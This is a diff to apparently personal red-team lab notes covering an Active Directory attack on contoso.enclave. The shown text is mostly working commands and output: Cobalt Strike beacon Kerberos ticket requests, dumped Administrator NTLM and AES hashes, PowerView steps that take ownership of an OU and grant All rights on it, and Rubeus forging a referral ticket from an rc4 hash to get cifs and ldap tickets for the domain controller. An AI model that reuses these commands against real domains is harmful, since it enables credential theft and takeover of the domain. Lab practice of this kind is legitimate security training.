@@ -257,6 +257,12 @@ now lets see whos in the container
 cn: S-1-5-21-1076548718-1118529210-2193484809-2601
 confirms that nikki green is in enclave access group!
 
+sAMAccountName: ENC-DC-1$
+--------------------
+sAMAccountName: ENC-FS-1$
+--------------------
+sAMAccountName: ENC-JMP-1$
+
 [04/30 20:16:17] beacon> krb_asktgt /user:ngreen /aes256:25307799aa98581a28d00e42b34b37eab0909c098d9f1c68a1569d7fe21c09e9
 [04/30 20:17:23] beacon> krb_asktgs /service:krbtgt/contoso.enclave /ticket:doIFm...
 [04/30 20:18:45] beacon> krb_asktgs /service:cifs/enc-fs-1.contoso.enclave /targetdomain:contoso.enclave /dc:enc-dc-1.contoso.enclave /ticket:doIF...
@@ -272,7 +278,34 @@ User : Administrator
   Hash NTLM: 0dde0e62341ba59c5520fab03d0d06bd
   AES? 944d3480bfaff5b385ff3422fac8fd13a3caab0f0f7ed241b0e5c8970a3c844a
 
-bloodhound seems to think that being the admin group gives us writeDACL over domain admins?
+enclave access also puts us in the admin group
+admin group has writeDACL over FS@contoso.enclave
 
-tomorrow!!
-beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as a member of (the group that holds this ACE):
+powerpick Set-DomainObjectOwner -Identity FS -OwnerIdentity Administrators -Domain contoso.enclave
+Now with ownership of the OU object, you may grant yourself the GenericAll permission. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
+
+powerpick Add-DomainObjectAcl -Identity F5FC9A78-EAA8-4B61-9BA4-011CAF14B56F -Rights All -Domain contoso.enclave
+powerpick Add-DomainObjectAcl -TargetIdentity f5fc9a78-eaa8-4b61-9ba4-011caf14b56f -TargetDomain contoso.enclave -Rights All -PrincipalIdentity S-1-5-32-544
+With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. 
+
+powerpick
+$OU = Get-DomainOU -Raw (F5FC9A78-EAA8-4B61-9BA4-011CAF14B56F) -Domain 
+$DsEntry = $OU.GetDirectoryEntry()
+$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
+$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
+$dsEntry.PsBase.CommitChanges()
+
+_______
+
+trying the forging referral tickets
+rc4: d1003fd1448f136b91465bc0081f6a53
+
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:ngreen /domain:CONTOSO.COM /sid:S-1-5-21-1076548718-1118529210-2193484809 /id:3601 /groups:513,2103 /service:krbtgt/contoso.enclave /rc4:d1003fd1448f136b91465bc0081f6a53 /nowrap
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/enc-fs-1.contoso.enclave /dc:enc-dc-1.contoso.enclave /ticket:
+
+now request...
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/enc-dc-1.contoso.enclave /dc:enc-dc-1.contoso.enclave /nowrap /ticket:
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/enc-dc-1.contoso.enclave /dc:enc-dc-1.contoso.enclave /nowrap /ticket:
+
